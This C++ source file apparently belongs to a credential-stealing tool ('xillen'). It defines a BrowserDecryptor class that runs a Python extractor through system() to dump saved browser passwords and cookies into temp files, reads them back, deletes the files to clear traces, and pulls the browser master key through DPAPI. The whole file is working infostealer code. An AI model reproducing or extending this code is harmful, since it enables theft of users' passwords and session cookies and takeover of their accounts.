#include "browser_decryptor.h"
#include "../crypto/dpapi.h"
#include <Windows.h>
#include <filesystem>
#include <fstream>
#include <sstream>
#include <iostream>
#include <cstring>
#include <cstdlib>

std::vector<std::string> BrowserDecryptor::DecryptPasswords(const std::string& dbPath) {
    std::vector<std::string> result;
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\"));
    
    std::string tempFile = std::filesystem::temp_directory_path().string() + "\\xillen_passwords.txt";
    
    std::string pythonCmd = "python ";
    pythonCmd += dir + "\\browser_extractor.py > ";
    pythonCmd += tempFile + " 2>&1";
    
    system(pythonCmd.c_str());
    
    if (std::filesystem::exists(tempFile)) {
        std::ifstream file(tempFile);
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty() && line.find("[INFO]") == std::string::npos) {
                result.push_back(line);
            }
        }
        file.close();
        std::filesystem::remove(tempFile);
    }
    
    if (result.empty()) {
        result.push_back("[INFO] No passwords extracted from browsers");
    }
    
    return result;
}

std::vector<std::string> BrowserDecryptor::DecryptCookies(const std::string& dbPath) {
    std::vector<std::string> result;
    
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\"));
    
    std::string tempFile = std::filesystem::temp_directory_path().string() + "\\xillen_cookies.txt";
    
    std::string pythonCmd = "python ";
    pythonCmd += dir + "\\browser_extractor.py > ";
    pythonCmd += tempFile + " 2>&1";
    
    system(pythonCmd.c_str());
    
    if (std::filesystem::exists(tempFile)) {
        std::ifstream file(tempFile);
        std::string line;
        while (std::getline(file, line)) {
            if (!line.empty() && line.find("cookie") != std::string::npos) {
                result.push_back(line);
            }
        }
        file.close();
        std::filesystem::remove(tempFile);
    }
    
    if (result.empty()) {
        result.push_back("[INFO] No cookies extracted from browsers");
    }
    
    return result;
}

std::string BrowserDecryptor::ExtractMasterKey(const std::string& localStatePath) {
    return DPAPI::ExtractMasterKey(localStatePath);
}
